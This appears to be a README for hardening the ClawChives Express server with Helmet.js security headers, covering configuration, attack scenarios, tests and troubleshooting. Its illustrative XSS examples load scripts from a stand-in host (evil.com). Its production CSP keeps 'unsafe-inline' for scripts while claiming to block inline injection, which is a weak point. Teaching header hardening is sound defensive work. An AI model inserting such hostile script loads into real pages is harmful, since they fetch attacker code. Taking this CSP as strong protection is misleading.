# 01: Security Headers (Helmet.js)

[![Priority](https://img.shields.io/badge/Priority-Critical-red)](#)
[![Complexity](https://img.shields.io/badge/Complexity-Low-green)](#)
[![Time](https://img.shields.io/badge/Time-2%20hours-blue)](#)

---

## Why This Matters

**Problem:** Modern browsers are vulnerable to:
- Cross-Site Scripting (XSS) - Malicious scripts injected into pages
- Clickjacking - Invisible iframes tricking users into clicking hidden elements
- MIME sniffing - Browsers executing files with wrong content types
- Insecure connections - HTTP traffic vulnerable to man-in-the-middle attacks

**Impact:** Without security headers, ClawChives is vulnerable to these common web attacks even if the code is secure.

**Solution:** HTTP security headers tell browsers to enforce security policies client-side.

---

## What This Implements

### Headers Added

| Header | Purpose | Value |
|--------|---------|-------|
| `Content-Security-Policy` | Blocks unauthorized scripts/styles | `default-src 'self'; script-src 'self' 'unsafe-inline'` |
| `Strict-Transport-Security` | Forces HTTPS for 1 year | `max-age=31536000; includeSubDomains; preload` |
| `X-Frame-Options` | Prevents clickjacking | `DENY` |
| `X-Content-Type-Options` | Blocks MIME sniffing | `nosniff` |
| `Referrer-Policy` | Controls referrer information | `strict-origin-when-cross-origin` |
| `X-XSS-Protection` | Legacy XSS protection (for old browsers) | `1; mode=block` |

### Why These Values?

**Content-Security-Policy (CSP):**
- `default-src 'self'` - Only load resources from same origin
- `script-src 'self' 'unsafe-inline'` - Allow inline scripts (Vite requires this in dev)
- `img-src 'self' data: https:` - Allow images from same origin, data URIs, and HTTPS
- `connect-src 'self'` - Only allow AJAX to same origin

**HSTS (Strict-Transport-Security):**
- `max-age=31536000` - Enforce HTTPS for 1 year
- `includeSubDomains` - Apply to all subdomains
- `preload` - Submit to browser HSTS preload list (optional)

**X-Frame-Options:**
- `DENY` - Never allow ClawChives in iframes (prevents clickjacking)

**X-Content-Type-Options:**
- `nosniff` - Don't guess content types, use server-provided MIME type

**Referrer-Policy:**
- `strict-origin-when-cross-origin` - Send full URL for same-origin, origin only for cross-origin HTTPS

---

## How It Works

### Integration Point
Helmet middleware is added early in the Express middleware chain (before routes, after `express.json()`).

```
Request Flow:
  ├─ express.json()         (parse JSON body)
  ├─ helmet()               ← ADD HERE (set security headers)
  ├─ cors()                 (CORS check)
  ├─ rate limiting          (check rate limits)
  ├─ requireAuth            (validate token)
  └─ route handlers         (business logic)
```

### Helmet Configuration
Helmet is a collection of 15+ smaller middleware functions. We configure the most important ones:

1. **contentSecurityPolicy** - CSP header
2. **hsts** - Strict-Transport-Security
3. **referrerPolicy** - Referrer-Policy
4. **Others enabled by default** - X-Frame-Options, X-Content-Type-Options, etc.

---

## Security Rationale

### Attack Scenarios Prevented

**XSS Attack (Blocked by CSP):**
```
Attacker injects: <script src="https://evil.com/steal.js"></script>
Without CSP: Script executes, steals user data
With CSP: Browser blocks script (not from 'self'), logs violation
```

**Clickjacking Attack (Blocked by X-Frame-Options):**
```
Attacker creates: <iframe src="https://clawchives.local"></iframe>
Without X-Frame-Options: ClawChives loads in iframe, user clicks hidden button
With X-Frame-Options: DENY: Browser refuses to load in iframe
```

**HTTPS Downgrade Attack (Blocked by HSTS):**
```
Attacker MITMs HTTP connection, intercepts credentials
Without HSTS: User visits http:// version, credentials stolen
With HSTS: Browser automatically upgrades to HTTPS, MITM fails
```

### OWASP Top 10 Coverage
- ✅ **A05:2021 – Security Misconfiguration** - Proper security headers configured
- ✅ **A03:2021 – Injection** - CSP blocks inline script injection
- ✅ **A02:2021 – Cryptographic Failures** - HSTS enforces encryption

---

## Implementation

See [code-snippets.ts](./code-snippets.ts) for full implementation.

### Quick Overview

**1. Install dependency:**
```bash
npm install helmet
```

**2. Import in server.js:**
```javascript
import helmet from "helmet";
```

**3. Add middleware (line 138, after express.json()):**
```javascript
app.use(helmet({
  contentSecurityPolicy: { /* config */ },
  hsts: { /* config */ },
  referrerPolicy: { policy: "strict-origin-when-cross-origin" }
}));
```

---

## Testing

### Manual Verification

**1. Check headers in browser:**
```bash
# Start server
npm run start:api

# Make request
curl -I http://localhost:4242/api/health

# Should see:
# Content-Security-Policy: default-src 'self'; ...
# Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
# X-Frame-Options: DENY
# X-Content-Type-Options: nosniff
# Referrer-Policy: strict-origin-when-cross-origin
```

**2. Test CSP violation (should be blocked):**
Open browser console on ClawChives UI, try:
```javascript
// This should fail with CSP violation error
const script = document.createElement('script');
script.src = 'https://evil.com/malicious.js';
document.body.appendChild(script);
// Console: Refused to load the script 'https://evil.com/malicious.js' because it violates the following Content Security Policy directive: "script-src 'self' 'unsafe-inline'"
```

**3. Test iframe blocking:**
Create test HTML file:
```html
<iframe src="http://localhost:4242"></iframe>
```
Open in browser → Should see: "Refused to display in a frame because it set 'X-Frame-Options' to 'deny'."

### Automated Tests

Create `tests/security/headers.test.js`:
```javascript
import request from 'supertest';
import app from '../server.js';

describe('Security Headers', () => {
  it('should set CSP header', async () => {
    const res = await request(app).get('/api/health');
    expect(res.headers['content-security-policy']).toContain("default-src 'self'");
  });

  it('should set HSTS header', async () => {
    const res = await request(app).get('/api/health');
    expect(res.headers['strict-transport-security']).toBe('max-age=31536000; includeSubDomains; preload');
  });

  it('should set X-Frame-Options', async () => {
    const res = await request(app).get('/api/health');
    expect(res.headers['x-frame-options']).toBe('DENY');
  });
});
```

---

## Configuration Options

### Development vs Production

**Development mode:**
```javascript
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "'unsafe-inline'", "'unsafe-eval'"], // Vite HMR needs eval
    }
  },
  hsts: false, // Don't enforce HTTPS in dev
}));
```

**Production mode (recommended config):**
```javascript
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "'unsafe-inline'"], // Keep unsafe-inline for Vite build
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", "data:", "https:"],
      connectSrc: ["'self'"],
      fontSrc: ["'self'"],
      objectSrc: ["'none'"],
      mediaSrc: ["'self'"],
      frameSrc: ["'none'"],
    },
  },
  hsts: {
    maxAge: 31536000,
    includeSubDomains: true,
    preload: true
  }
}));
```

### Tuning CSP for Your Needs

**If you need to load external images (favicons):**
```javascript
imgSrc: ["'self'", "data:", "https:", "http:"] // Allow all images
```

**If you use a CDN:**
```javascript
scriptSrc: ["'self'", "'unsafe-inline'", "https://cdn.jsdelivr.net"]
```

**If CSP is too strict and breaks the UI:**
```javascript
contentSecurityPolicy: false // Disable CSP (NOT RECOMMENDED)
```

---

## Common Issues & Troubleshooting

### Issue: Vite HMR Breaks
**Symptom:** Vite hot module reload stops working in development.

**Solution:** Add `'unsafe-eval'` to `scriptSrc` in dev mode:
```javascript
const isDev = process.env.NODE_ENV !== 'production';
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      scriptSrc: isDev ? ["'self'", "'unsafe-inline'", "'unsafe-eval'"] : ["'self'", "'unsafe-inline'"],
    }
  }
}));
```

### Issue: HSTS Locks You Out
**Symptom:** Browser refuses to connect to `http://localhost` after enabling HSTS.

**Solution:**
1. Clear HSTS cache in browser (chrome://net-internals/#hsts → Delete domain)
2. Only enable HSTS in production, not dev:
   ```javascript
   hsts: process.env.NODE_ENV === 'production' ? { maxAge: 31536000 } : false
   ```

### Issue: Inline Styles Break
**Symptom:** Tailwind/CSS styles don't apply after enabling CSP.

**Solution:** Add `'unsafe-inline'` to `styleSrc`:
```javascript
styleSrc: ["'self'", "'unsafe-inline'"]
```

---

## Integration with Existing Code

### Before (server.js line 138):
```javascript
app.use(express.json({ limit: "10mb" }));
app.use(cors({ /* ... */ }));
```

### After:
```javascript
app.use(express.json({ limit: "10mb" }));

// ✅ ADD SECURITY HEADERS
import helmet from "helmet";
app.use(helmet({
  contentSecurityPolicy: { /* ... */ },
  hsts: { /* ... */ },
  referrerPolicy: { policy: "strict-origin-when-cross-origin" }
}));

app.use(cors({ /* ... */ }));
```

**Files modified:**
- [server.js](../../server.js) - Add helmet import and middleware
- [package.json](../../package.json) - Add `helmet` dependency

**No breaking changes:** Helmet is passive (only adds headers), existing functionality unchanged.

---

## Next Steps

1. ✅ Review this README
2. ✅ Review [code-snippets.ts](./code-snippets.ts)
3. ⬜ Implement in server.js
4. ⬜ Test manually (curl, browser dev tools)
5. ⬜ Verify CSP violations logged in console
6. ⬜ Proceed to [02-rate-limiting](../02-rate-limiting/README.md)

---

## References

- [Helmet.js Documentation](https://helmetjs.github.io/)
- [OWASP Secure Headers Project](https://owasp.org/www-project-secure-headers/)
- [MDN: Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [MDN: HTTP Strict Transport Security](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security)
